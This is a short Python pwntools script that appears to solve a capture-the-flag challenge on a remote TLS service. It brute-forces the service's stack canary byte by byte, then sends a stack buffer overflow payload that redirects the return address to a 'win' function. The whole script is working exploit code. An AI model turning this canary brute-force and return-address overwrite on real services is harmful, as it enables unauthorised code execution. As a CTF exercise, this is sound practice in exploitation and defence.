from pwn import *
import random

win_addr = 0x00401216
# p = gdb.debug("./main", gdbscript="""
#                 set follow-fork-mode parent
#                 b *0x401360
#                 c
#               """)
#p = process("./main")
p = remote("inst-jek4cgmec5.tls.vuln.si", 443, ssl=True)

for x in range(1000):
    p.sendline(b"3")

p.recvuntil("You have 5010 HP. What do you want to do?")

canary_bytes = []
for s in range(8):
    print(f"Searching for canary byte {s}")
    payload = cyclic(40)
    for b in canary_bytes:
        payload+=p8(b)
    for x in range(0x0, 0x100):
        p.sendline("1")

        p.send(payload+p8(x))

        output = p.recvuntil("You have ")
        if(not b"Ouch! This was unexpected!" in output):
            canary_bytes.append(x)
            payload += p8(x)
            print(f"pass {hex(x)}")
            break

canary = u64(bytes(canary_bytes))

print(canary_bytes)
print(len(canary_bytes))
print(f"FOUND CANARY {hex(canary)}")

# gdb.attach(p, gdbscript="""
#            c""")

#input()

p.sendline("1")
payload = cyclic(40) + p64(canary) + p64(win_addr)+p64(win_addr)
p.send(payload)

p.interactive()


